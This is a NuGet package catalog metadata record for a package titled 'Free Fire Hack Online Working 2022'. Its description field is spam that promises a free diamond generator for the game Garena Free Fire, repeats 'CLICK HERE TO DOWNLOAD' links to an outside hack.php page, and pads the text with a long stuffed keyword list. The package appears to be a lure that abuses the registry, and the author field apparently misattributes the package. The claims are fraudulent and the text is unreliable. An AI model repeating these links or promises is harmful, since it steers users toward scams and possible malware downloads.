{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.10.53.57/_free-fire-hack-online-working-2022-version-zyw.5.5.37.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "33dfc082-3329-454f-a4bd-f863c74572aa",
  "catalog:commitTimeStamp": "2022-01-26T10:53:57.2045Z",
  "created": "2022-01-26T10:49:28.783Z",
  "description": "# _Free Fire Hack Online Working 2022 Version zyw\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://6.bltadwin.ru/hack.php](http://6.bltadwin.ru/hack.php)\n\n\nFree Fire Hack Diamond Visit the website linked to it below to start generate: download Details. Status online: Users. Your Garena Free Fire Hack is now complete and the Diamond will be available in your account. About Free Fire Free. E.g., Google Play Store Promotional Offer, Garena Free Fire Topup offer, Online Earing Method, Diamonds hacking tool  using Diamonds.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://6.bltadwin.ru/hack.php](http://6.bltadwin.ru/hack.php)\n\nGarena Free Fire Hack Free Fire, also known by its full name Garena Free Fire, may be a free mobile Battle Royale game that many players enjoy every month. The currency of this incredibly addictive game is “Diamonds”, so they usually buy the Elite Pass, which increases the rewards you receive when you play this mobile shooter. Free Fire Online Diamonds and Coins Hack There are many hacks for Free Fire that can be used. Each one requires different methods. However, this generator generates free fire and is easy to use. You don't have to be crushed by your enemies. When you have unlimited emo, which you purchased from diamonds with the help of a free fire generator, you can have all the fun .  · Check out the step-by-step guide on how to get free diamonds in Free Fire without reloading here, and Garena Free Fire offers a wide variety of characters, costumes, weapons, and more in-game. For example, Google Play Promotional Offer, Garena Free Top-Up Offer, Online Stitching Method, Diamond Hack Tool, and Diamond Generator Script.\n\nfree fire hack online generator 99.999 diamond, free fire hack online game, free fire hack online diamond generator, free fire hack online generator 2020, free fire hack online generator download, free fire battlegrounds hack online tool, sms bomber free fire id hack online, the best online garena free fire hack, free fire battleground hack online, free fire battlegrounds hack online generator, free fire battle fun online hack, free fire online hack club, free fire hacking course online, free fire diamond hack online.com, free fire online hack diamonds and coins, free fire online hack diamonds and coins generator, free fire character hack online, free fire hack.com tool online, free fire magic cube hack online, free fire hack download online, garena free fire hack online diamond, free fire hack no survey online diamonds generator, free fire online hack unlimited diamonds, free fire emotes hack online, free fire elite pass hack online, free fire gun hack online, garena free fire hack  cheat online for android and ios devices, ff2. online free fire hack, free fire hack free diamonds online cheat, free fire hack-online generator http //flob. fun/fair, free fire hack online generator flob.fun/fire, http flop fun free fire hack-online generator, free fire diamond hack online generator 2020, free fire diamond hack online game, free fire unlimited diamond hack online generator, garena free fire hack online generator 99 999 diamond, free fire health hack online, free fire headshot hack online, garena free fire hack online generator heroic notions, garena free fire hack online generator diamonds without human verification, free fire pet hack is online, free fire id hack online website, garena free fire online hack kim cương, hack kim cương free fire online, hack kc free fire online, free fire hack mod online, free fire diamond hack mod online, free fire mobile hack tool online, myself online hack free fire, free fire mobile hack online, free fire diamond hack online play, garena free fire hack online play, free fire pink diamond hack online, free fire online hack real, free fire diamond hack real online, free fire gun skin hack online, free fire hack to online, free fire diamond hack online tool, free fire diamond hack online tool 2020, free fire diamond hack tool onli",
  "id": "_Free-Fire-Hack-Online-Working-2022-Version-zyw",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-26T10:53:42.283Z",
  "listed": true,
  "packageHash": "C5ntfUdpERgzXsgODokatRs2hHZ+i/H4wJK3L5saEl/MYzGKfc+oLzWGouEQS72KfhI3kJNfVtTj/2BYTT+1tQ==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11647,
  "published": "2022-01-26T10:49:28.783Z",
  "requireLicenseAcceptance": false,
  "title": "_Free-Fire-Hack-Online-Working-2022-Version-zyw",
  "verbatimVersion": "5.5.37",
  "version": "5.5.37",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.10.53.57/_free-fire-hack-online-working-2022-version-zyw.5.5.37.json#sisksdnxxk.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1518,
      "fullName": "sisksdnxxk.nuspec",
      "length": 4471,
      "name": "sisksdnxxk.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.10.53.57/_free-fire-hack-online-working-2022-version-zyw.5.5.37.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9469,
      "fullName": ".signature.p7s",
      "length": 9469,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}